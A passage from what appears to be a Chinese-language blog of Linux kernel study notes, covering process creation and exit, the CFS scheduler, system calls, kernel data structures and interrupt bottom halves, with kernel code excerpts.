(retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_mm;</span><br><span class="line">retval = copy_io(clone_flags, p);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_namespaces;</span><br><span class="line">retval = copy_thread_tls(clone_flags, stack_start, stack_size, p, tls);</span><br><span class="line"><span class="keyword">if</span> (retval)</span><br><span class="line">	<span class="keyword">goto</span> bad_fork_cleanup_io;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用 alloc_pid() 为新进程分配一个有效的PID（copy_process() 返回）</li>
<li>根据 clone() 的参数标志 clone_flags，拷贝或共享相应的信息</li>
<li>做一些扫尾工作并返回新进程指针</li>
</ul>
<p>用户态创建进程的 fork() 函数实际上最终是调用 clone() 系统调用，创建线程和进程的步骤一样，只是最终传给 clone() 的参数不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7ea1f3d</span> &lt;fork+<span class="number">77</span>&gt;    syscall  &lt;SYS_clone&gt;</span><br><span class="line">       fn: <span class="number">0x1200011</span></span><br><span class="line">       child_stack: <span class="number">0x0</span></span><br><span class="line">       flags: <span class="number">0x0</span></span><br><span class="line">       arg: <span class="number">0x7ffff7fb2810</span> ◂— <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>在内核中创建的内核线程与普通的进程之间还有个主要区别在于：</p>
<ul>
<li>内核线程没有独立的地址空间，它们只能在内核空间运行</li>
<li>这与之前提到的 Linux 内核是个单内核有关</li>
</ul>
<p><strong>Linux 进程的终止</strong></p>
<p>和创建进程一样，终结一个进程同样有很多步骤：</p>
<p>子进程上的操作：（do_exit）</p>
<ul>
<li>设置 task_struct 中的标识成员设置为 PF_EXITING</li>
<li>调用 del_timer_sync() 删除内核定时器, 确保没有定时器在排队和运行</li>
<li>调用 exit_mm() 释放进程占用的 mm_struct</li>
<li>调用 sem__exit() ，使进程离开等待 IPC 信号的队列</li>
<li>调用 exit_files() 和 exit_fs()，释放进程占用的文件描述符和文件系统资源</li>
<li>把 task_struct 的 exit_code 设置为进程的返回值</li>
<li>调用 exit_notify() 向父进程发送信号，并把自己的状态设为 EXIT_ZOMBIE</li>
<li>切换到新进程继续执行</li>
</ul>
<p>子进程进入 EXIT_ZOMBIE 之后，虽然永远不会被调度，关联的资源也释放掉了，但是它本身占用的内存还没有释放（比如：创建时分配的内核栈，task_struct 结构等），这些由父进程来释放</p>
<p>父进程上的操作：（release_task）</p>
<ul>
<li>父进程受到子进程发送的 exit_notify() 信号后，将该子进程的进程描述符和所有进程独享的资源全部删除</li>
</ul>
<p>从上面的步骤可以看出，必须要确保每个子进程都有父进程，如果父进程在子进程结束之前就已经结束了会怎么样呢？</p>
<ul>
<li>子进程在调用 exit_notify() 时已经考虑到了这点</li>
<li>如果子进程的父进程已经退出了，那么子进程在退出时，exit_notify() 函数会先调用 forget_original_parent() ，然后再调用 find_new_reaper() 来寻找新的父进程</li>
<li>find_new_reaper() 函数先在当前线程组中找一个线程作为父亲，如果找不到，就让 init 做父进程（init 进程是在 linux 启动时就一直存在的）</li>
</ul>
<h2 id="进程的调度"><a href="#进程的调度" class="headerlink" title="进程的调度"></a>进程的调度</h2><p>现在的操作系统都是多任务的，为了能让更多的任务能同时在系统上更好的运行，需要一个管理程序来管理计算机上同时运行的各个任务（也就是进程）</p>
<p>这个管理程序就是调度程序，它的功能说起来很简单：</p>
<ul>
<li>决定哪些进程运行，哪些进程等待</li>
<li>决定每个进程运行多长时间</li>
</ul>
<p>此外，为了获得更好的用户体验，运行中的进程还可以立即被其他更紧急的进程打断</p>
<p>总之，调度是一个平衡的过程：</p>
<ul>
<li>一方面，它要保证各个运行的进程能够最大限度的使用CPU（即尽量少的切换进程，进程切换过多，CPU的时间会浪费在切换上）</li>
<li>另一方面，保证各个进程能公平的使用CPU（即防止一个进程长时间独占CPU的情况）</li>
</ul>
<p><strong>完全公平调度器 CFS</strong></p>
<p>前面说过，调度功能就是决定哪个进程运行以及进程运行多长时间</p>
<p>进程的优先级有2种度量方法，一种是 nice 值，一种是实时优先级：（实时优先级 &gt; nice 值）</p>
<ul>
<li>nice 值的范围是 -20～19，值越大优先级越低，也就是说 nice 值为 -20 的进程优先级最大</li>
<li>实时优先级的范围是 0～99，与 nice 值的定义相反，实时优先级是值越大优先级越高</li>
</ul>
<p>实时进程都是一些对响应时间要求比较高的进程，因此系统中有实时优先级高的进程处于运行队列的话，它们会抢占一般的进程的运行时间</p>
<p>介绍下 CFS：</p>
<ul>
<li>CFS 使用红黑树结构，来存储要调度的任务队列</li>
<li>每个节点代表了一个要调度的任务，节点的 key 即为虚拟时间（vruntime），虚拟时间由这个人物的运行时间计算而来</li>
<li>key 越小，也就是 vruntime 越小的话，红黑树对应的节点就越靠左</li>
<li>CFS scheduler 每次都挑选最左边的节点作为下一个要运行的任务，这个节点是“缓存的”，由一个特殊的指针指向，不需要进行 <code>O(logn)</code> 遍历来查找，也因此，CFS 搜索的时间是 <code>O(1)</code></li>
</ul>
<p>vruntime(key) 的计算公式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += 实际运行时间(time process run) * <span class="number">1024</span> / 进程权重(load weight of <span class="keyword">this</span> process)</span><br></pre></td></tr></table></figure>
<ul>
<li>实际运行时间：该程序已经运行了多久 </li>
<li>进程权重：根据任务的 nice 值进行索引</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> prio_to_weight[<span class="number">40</span>] = &#123;</span><br><span class="line"> <span class="comment">/* -20 */</span>     <span class="number">88761</span>,     <span class="number">71755</span>,     <span class="number">56483</span>,     <span class="number">46273</span>,     <span class="number">36291</span>,</span><br><span class="line"> <span class="comment">/* -15 */</span>     <span class="number">29154</span>,     <span class="number">23254</span>,     <span class="number">18705</span>,     <span class="number">14949</span>,     <span class="number">11916</span>,</span><br><span class="line"> <span class="comment">/* -10 */</span>      <span class="number">9548</span>,      <span class="number">7620</span>,      <span class="number">6100</span>,      <span class="number">4904</span>,      <span class="number">3906</span>,</span><br><span class="line"> <span class="comment">/*  -5 */</span>      <span class="number">3121</span>,      <span class="number">2501</span>,      <span class="number">1991</span>,      <span class="number">1586</span>,      <span class="number">1277</span>,</span><br><span class="line"> <span class="comment">/*   0 */</span>      <span class="number">1024</span>,       <span class="number">820</span>,       <span class="number">655</span>,       <span class="number">526</span>,       <span class="number">423</span>,</span><br><span class="line"> <span class="comment">/*   5 */</span>       <span class="number">335</span>,       <span class="number">272</span>,       <span class="number">215</span>,       <span class="number">172</span>,       <span class="number">137</span>,</span><br><span class="line"> <span class="comment">/*  10 */</span>       <span class="number">110</span>,        <span class="number">87</span>,        <span class="number">70</span>,        <span class="number">56</span>,        <span class="number">45</span>,</span><br><span class="line"> <span class="comment">/*  15 */</span>        <span class="number">36</span>,        <span class="number">29</span>,        <span class="number">23</span>,        <span class="number">18</span>,        <span class="number">15</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>相当于 nice 和 weight 是等价的，但是不同 nice 值的任务权重差别变大了</li>
</ul>
<p>例子：现在我们有一个刚来的进程 [time=0，nice=0，priority=1024]：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vruntime += <span class="number">0</span> * <span class="number">1024</span> / <span class="number">1024</span> = <span class="number">10</span> <span class="comment">/* vruntime有一个最小值min_vruntime */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>vruntime 并不是无限小的，有一个最小值来限定 min_vruntime </li>
<li>假如新进程的 vruntime 初值为0的话，比老进程的值小很多，那么它在相当长的时间内都会保持抢占CPU的优势，老进程就要饿死了，这显然是不公平的</li>
</ul>
<p>CFS 是这样做的：每个CPU的运行队列 cfs_rq 都维护一个 min_vruntime 字段，记录该运行队列中所有进程的 vruntime 最小值，新进程的初始 vruntime 值就以它所在运行队列的 min_vruntime 为基础来设置，与老进程保持在合理的差距范围内</p>
<p>对于新任务来说，vruntime = 0（任务：用于完成某个操作的一组 [进程,线程]，用 <code>task_struct</code> 结构体来描述）</p>
<p><strong>关于时间片</strong></p>
<p>决定哪个进程运行以及运行多长时间都和进程的优先级有关，但是对于调度程序来说，并不是运行一次就结束了，还必须知道间隔多久进行下次调度</p>
<p>为了确定一个进程到底能持续运行多长时间，调度中还引入了时间片的概念，也可以认为是进程在下次调度发生前运行的时间（除非进程主动放弃CPU，或者有实时进程来抢占CPU）</p>
<p>时间片的大小设置并不简单：</p>
<ul>
<li>设大了，系统响应变慢（调度周期长）</li>
<li>设小了，进程频繁切换带来的处理器消耗</li>
<li>默认的时间片一般是10ms</li>
</ul>
<p><strong>调度策略</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>策略</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHED_NORMAL</td>
<td>普通的分时进程，使用的 fair_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_FIFO</td>
<td>先进先出的实时进程，当调用程序把CPU分配给进程的时候，它把该进程描述符保留在运行队列链表的当前位置，此调度策略的进程一旦使用CPU则一直运行，如果没有其他可运行的更高优先级实时进程，进程就继续使用CPU，想用多久就用多久，即使还有其他具有相同优先级的实时进程处于可运行状态，使用的是 rt_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_RR</td>
<td>时间片轮转的实时进程，当调度程序把CPU分配给进程的时候，它把该进程的描述符放在运行队列链表的末尾，这种策略保证对所有具有相同优先级的 SCHED_RR 实时进程进行公平分配CPU时间，使用的 rt_sched_class 调度类</td>
</tr>
<tr>
<td>SCHED_BATCH</td>
<td>是 SCHED_NORMAL 的分化版本，采用分时策略，根据动态优先级，分配CPU资源，在有实时进程的时候，实时进程优先调度，但针对吞吐量优化，除了不能抢占外与常规进程一样，允许任务运行更长时间，更好使用高速缓存，适合于成批处理的工作，使用的 fair_shed_class 调度类</td>
</tr>
<tr>
<td>SCHED_IDLE</td>
<td>优先级最低，在系统空闲时运行，使用的是 idle_sched_class 调度类，给0号进程使用</td>
</tr>
<tr>
<td>SCHED_DEADLINE</td>
<td>新支持的实时进程调度策略，针对突发型计算，并且对延迟和完成时间敏感的任务使用，基于 EDF（earliest deadline first），使用的是 dl_sched_class 调度类</td>
</tr>
</tbody>
</table>
</div>
<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>简单来说，系统调用就是用户程序和硬件设备之间的桥梁，用户程序在需要的时候，通过系统调用来使用硬件设备</p>
<p>系统调用的存在，有以下重要的意义：</p>
<ul>
<li>用户程序通过系统调用来使用硬件，而不用关心具体的硬件设备，这样大大简化了用户程序的开发 </li>
<li>系统调用使得用户程序有更好的可移植性</li>
<li>系统调用使得内核能更好的管理用户程序，增强了系统的稳定性 </li>
<li>系统调用有效的分离了用户程序和内核的开发</li>
</ul>
<p>用户程序，系统调用，内核，硬件设备的调用关系如下图： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660827734080-1660902016579.png" class width="1660827734080"> 
<p>要想实现系统调用，主要实现以下几个方面：</p>
<ul>
<li>通知内核调用一个哪个系统调用（系统调用号）</li>
<li>用户程序把系统调用的参数传递给内核（前5个参数放在 [ebx,ecx,edx,esi,edi] 中，如果参数多的话，还需要用个单独的寄存器存放指向所有参数在用户空间地址的指针）</li>
<li>用户程序获取内核返回的系统调用返回值（获取系统调用的返回值也是通过寄存器，在x86系统上，返回值放在 [eax] 中）</li>
</ul>
<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><p>Linux 中4个基本的内核数据结构：链表，队列，映射，红黑树</p>
<p><strong>链表</strong></p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832270823-1660902016580.png" class width="1660832270823"> 
<ul>
<li>有个单独的头结点（head）</li>
<li>每个节点（node）除了包含必要的数据之外，还有2个指针（pre,next）</li>
<li>pre 指针指向前一个节点（node），next 指针指向后一个节点（node）</li>
<li>头结点（head）的 pre 指针指向链表的最后一个节点</li>
<li>最后一个节点的next指针指向头结点（head）</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832773428-1660902016580.png" class width="1660832773428"> 
<ul>
<li>其实就是把数据放在前面了而已</li>
</ul>
<p><strong>队列</strong></p>
<p>内核中的队列是以字节形式保存数据的，所以获取数据的时候，需要知道数据的大小，如果从队列中取得数据时指定的大小不对的话，取得数据会不完整或过大</p>
<ul>
<li>队列是限制在两端进行插入操作和删除操作的线性表，允许进行存入操作的一端称为“队尾”，允许进行删除操作的一端称为“队头”</li>
<li>当线性表中没有元素时，称为“空队”</li>
<li>特点：先进先出（FIFO）</li>
</ul>
<p>顺序队列：</p>
<p>建立顺序队列结构必须为其静态分配或动态申请一片连续的存储空间，并设置两个指针进行管理：</p>
<ul>
<li>一个是队头指针 front，它指向队头元素</li>
<li>另一个是队尾指针 rear，它指向下一个入队元素的存储位置 </li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834074319-1660902016580.png" class width="1660834074319"> 
<p>链式队列：</p>
<p>一个链队列显然需要两个分别指示队头和队尾的指针（分别成为头指针和尾指针）才能唯一确定：</p>
<ul>
<li>这里，和线性表的单链表一样，为了操作方便起见，我们也给队列添加一个头结点，并令头指针指向头节点</li>
<li>由此，空的链队列的判决条件为头指针和尾指针均指向头结点</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834323260-1660902016580.png" class width="1660834323260"> 
<p><strong>映射</strong></p>
<p>映射（也称为关联数组）是实现（key，value）绑定的一种数据结构（有点像其他语言中的字典类型），每个唯一的ID对应一个自定义的数据结构</p>
<p>在 Linux 中的使用案例就是：整数ID管理机制（IDR）</p>
<ul>
<li>IDR 是用于将 uid 和一个数据地址进行绑定的一种映射</li>
<li>IDR 把每一个ID分级数据进行管理，每一级维护着ID的5位数据，这样就可以把IDR分为7级进行管理</li>
<li>IDR 底层使用了 redix 树 </li>
</ul>
<p>IDR 怎么对于数据ID管理呢？传统上我们对于未使用的ID进行管理的时候可以使用位图进行管理，也可以使用数组进行管理，也可以使用链表进行ID管理，三个个各有优缺点：</p>
<ul>
<li>使用位图进行管理：使用空间少，但是对于位图对应的数据结构支持不太友好</li>
<li>使用数组进行管理：寻址快速，但是只能管理比较少量的ID数目</li>
<li>使用链表进行管理：可以支持大量的数据ID，但是通过链表的指针寻址比较慢</li>
</ul>
<p>而 IDR 管理可以集合以上3者的优点</p>
<p>IDR 中有两个数据结构：idr 和 idr_layer </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr</span> &#123;</span>                    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>    *<span class="title">hint</span>;</span>      <span class="comment">/* 最近一个存储指针数据的的idr_layer结构  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>    *<span class="title">top</span>;</span>       <span class="comment">/* idr的顶层(根节点) */</span></span><br><span class="line">    <span class="keyword">int</span>            layers;                <span class="comment">/* idr树中的idr_layer层数量 */</span></span><br><span class="line">    <span class="keyword">int</span>            cur;                   <span class="comment">/* current pos for cyclic allocation */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;                </span><br><span class="line">    <span class="keyword">int</span>            id_free_cnt;			<span class="comment">/* idr_layer空闲链表中剩余的idr_layer个数 */</span>            </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span>    *<span class="title">id_free</span>;</span>		<span class="comment">/* 指向idr_layer的空闲链表 */</span>        </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>struct idr 类似于 list_head，用于管理 IDR 整个树的信息</li>
<li>其中最关键的是 top，它指向了根节点的 idr_layer</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>			prefix;                        <span class="comment">/* the ID prefix of this idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			layer;                        <span class="comment">/* 第几层 distance from leaf */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>	*<span class="title">ary</span>[1&lt;</span>&lt;IDR_BITS]; <span class="comment">/* IDR_BITS = 8 该层有256个指针,指向256个idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			count;                        <span class="comment">/* ary数组使用计数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		DECLARE_BITMAP(bitmap, IDR_SIZE);	  <span class="comment">/* 槽位图 */</span>		</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如图：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660836387459-1660902016580.png" class width="1660836387459"> 
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1432802">linux内核IDR机制详解</a> </p>
<p><strong>红黑树</strong></p>
<p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
<p>红黑规则：</p>
<ul>
<li>节点不是黑色，就是红色（非黑即红）</li>
<li>根节点为黑色，叶节点为黑色（叶节点是指末梢的空节点 <code>Nil</code>或<code>Null</code>）</li>
<li>一个节点为红色，则其两个子节点必须是黑色的（根到叶子的所有路径，不可能存在两个连续的红色节点）</li>
<li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
</ul>
<p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡：</p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1655523602992-1660902016580.png" class width="1655523602992"> 
<h2 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h2><p>为了提高CPU和外围硬件（硬盘，键盘，鼠标等等）之间协同工作的性能，引入了中断的机制，中断机制是硬件在需要的时候向CPU发出信号，CPU暂时停止正在进行的工作，来处理硬件请求的一种机制</p>
<ul>
<li>异步中断（一般由硬件引起）：CPU 处理中断的时间过长，所以先将硬件复位，使硬件可以继续自己的工作，然后在适当时候处理中断请求中耗时的部分</li>
<li>同步中断：CPU 处理完中断请求的所有工作后才反馈硬件 </li>
</ul>
<p>为了在中断执行时间尽可能短和中断处理需完成大量工作之间找到一个平衡点，Linux 将中断处理程序分解为两个半部：顶半部（top half）和底半部（bottom half）：</p>
<ul>
<li>顶半部完成尽可能少的比较紧急的功能，它往往只是 <strong>简单地读取寄存器中的中断状态并清除中断标志后就进行“登记中断”的工作</strong>（“登记中断”：将底半部处理程序挂到该设备的执行队列中去），这样，顶半部执行的速度就会很快，可以服务更多的中断请求</li>
<li>现在，中断处理工作的重心就落在了底半部的头上，<strong>底半部负责执行中断处理程序</strong>，它来完成中断事件的绝大多数任务，而且可以被新的中断打断</li>
<li>顶半部往往被设计成不可中断，底半部则相对来说并不是非常紧急的，而且相对比较耗时，不在硬件中断服务程序中执行，所以可以打断</li>
</ul>
<p>简单来说就是：</p>
<ul>
<li>顶半部：登记中断，把底半部处理程序挂到该设备的执行队列中，不可中断</li>
<li>底半部：负责中断处理程序的具体实现，可中断</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660878766425.png" class width="1660878766425"> 
<p>实现底半部的方法很多，目前使用最多的是以下3中方法：</p>
<ul>
<li>软中断</li>
<li>tasklet</li>
<li>工作队列</li>
</ul>
<p><strong>软中断</strong></p>
<p>软中断的流程如下： </p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660879056533.png" class width="1660879056533"> 
<p>注册软中断的函数 open_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_softirq</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">void</span> (*action)(struct softirq_action *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    softirq_vec[nr].action = action; <span class="comment">/* softirq_vec是个struct softirq_action类型的数组 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>将软中断类型和软中断处理函数加入到软中断序列中：</p>
<ul>
<li><p>@nr - 软中断类型</p>
<ul>
<li>@(<em>action)(struct softirq_action </em>) - 软中断处理的函数指针</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>结构体 softirq_action 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">softirq_action</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>    (*action)(struct softirq_action *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个结构体的字段是个函数指针，字段名称是 action</li>
<li>函数指针的参数是 struct softirq_action 的地址，其实就是指向 softirq_vec 中的某一项：<ul>
<li>如果 open_softirq 是这样调用的：<code>open_softirq(NET_TX_SOFTIRQ, my_tx_action)</code></li>
<li>那么 my_tx_action 的参数就是：<code>softirq_vec[NET_TX_SOFTIRQ]</code> 的地址</li>
</ul>
</li>
</ul>
<p>触发软中断的函数 raise_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">raise_softirq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    local_irq_save(flags); <span class="comment">/* 保存寄存器 */</span></span><br><span class="line">    raise_softirq_irqoff(nr); <span class="comment">/* 触发软中断 */</span></span><br><span class="line">    local_irq_restore(flags); <span class="comment">/* 恢复寄存器 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>触发某个中断类型的软中断：<ul>
<li>@nr - 被触发的中断类型</li>
</ul>
</li>
</ul>
<p>执行软中断的函数 do_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">void</span> <span class="title">do_softirq</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 pending;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 判断是否在中断处理中，如果正在中断处理，就直接返回 */</span></span><br><span class="line">    <span class="keyword">if</span> (in_interrupt())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 保存当前寄存器的值 */</span></span><br><span class="line">    local_irq_save(flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 取得当前已注册软中断的位图 */</span></span><br><span class="line">    pending = local_softirq_pending();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 循环处理所有已注册的软中断 */</span></span><br><span class="line">    <span class="keyword">if</span> (pending)</span><br><span class="line">        __do_softirq();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复寄存器的值到中断处理前 */</span></span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>tasklet</strong></p>
<p>tasklet 也是利用软中断来实现的，但是它提供了比软中断更好用的接口（其实就是基于软中断又封装了一下）</p>
<ul>
<li>所以除了对性能要求特别高的情况，一般建议使用 tasklet 来实现自己的中断</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span> <span class="comment">/* 链表中的下一个tasklet */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> state;         <span class="comment">/* tasklet状态 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;              <span class="comment">/* 引用计数器 */</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>); <span class="comment">/* tasklet处理函数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> data;          <span class="comment">/* tasklet处理函数的参数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>工作队列</strong></p>
<p>工作队列子系统是一个 <strong>用于创建内核线程的接口</strong> ，通过它可以创建一个 [工作者线程] 来专门处理中断的下半部工作</p>
<ul>
<li>工作队列和 tasklet 不一样，不是基于软中断来实现的</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660882969270.png" class width="1660882969270"> 
<p>工作队列主要用到下面3个结构体，弄懂了这3个结构体的关系，也就知道工作队列的处理流程了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在include/linux/workqueue.h文件中定义 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> data;             <span class="comment">/* 这个并不是处理函数的参数,而是表示此work是否pending等状态的flag */</span></span><br><span class="line"><span 